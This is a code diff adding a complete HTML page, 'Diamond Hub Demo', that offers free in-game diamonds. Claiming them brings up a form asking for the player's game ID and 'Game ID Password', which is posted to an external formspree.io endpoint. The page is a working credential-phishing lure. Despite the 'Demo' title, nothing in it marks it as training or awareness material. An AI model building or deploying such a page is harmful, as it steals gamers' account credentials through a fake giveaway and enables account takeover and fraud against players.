@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Diamond Hub Demo</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+color:white;
+text-align:center;
+}
+
+header{
+background:black;
+padding:20px;
+font-size:28px;
+}
+
+.container{
+margin-top:40px;
+}
+
+.card{
+display:inline-block;
+background:#1e1e1e;
+padding:20px;
+margin:15px;
+border-radius:12px;
+width:220px;
+}
+
+button{
+background:#ff9800;
+border:none;
+padding:10px 20px;
+font-weight:bold;
+border-radius:6px;
+cursor:pointer;
+}
+
+button:hover{
+background:#ffc107;
+}
+
+#formPage{
+display:none;
+margin-top:60px;
+}
+
+input{
+padding:10px;
+margin:10px;
+width:250px;
+border-radius:5px;
+border:none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header>🔥 Diamond Hub Demo</header>
+
+<div id="mainPage" class="container">
+
+<div class="card">
+<h2>💎 100 Diamonds</h2>
+<button onclick="claim(100)">Claim</button>
+</div>
+
+<div class="card">
+<h2>💎 310 Diamonds</h2>
+<button onclick="claim(310)">Claim</button>
+</div>
+
+<div class="card">
+<h2>💎 520 Diamonds</h2>
+<button onclick="claim(520)">Claim</button>
+</div>
+
+</div>
+
+
+<div id="formPage">
+
+<h1>Enter Details</h1>
+<p id="diamondText"></p>
+
+<form action="https://formspree.io/f/xpqydzke" method="POST">
+
+<input type="text" name="player_name" placeholder="Enter Game ID" required>
+<br>
+
+<input type="text" name="game_id" placeholder="Enter Game ID Password" required>
+<br>
+
+<input type="hidden" name="diamonds" id="diamondInput">
+
+<br>
+<button type="submit">Submit</button>
+
+</form>
+
+<br>
+<button onclick="goBack()">Back</button>
+
+</div>
+
+
+<script>
+
+function claim(amount){
+
+document.getElementById("mainPage").style.display="none";
+document.getElementById("formPage").style.display="block";
+
+document.getElementById("diamondText").innerHTML =
+"You selected " + amount + " diamonds";
+
+document.getElementById("diamondInput").value = amount;
+
+}
+
+function goBack(){
+
+document.getElementById("formPage").style.display="none";
+document.getElementById("mainPage").style.display="block";
+
+}
+
+</script>
+
+</body>
+</html>
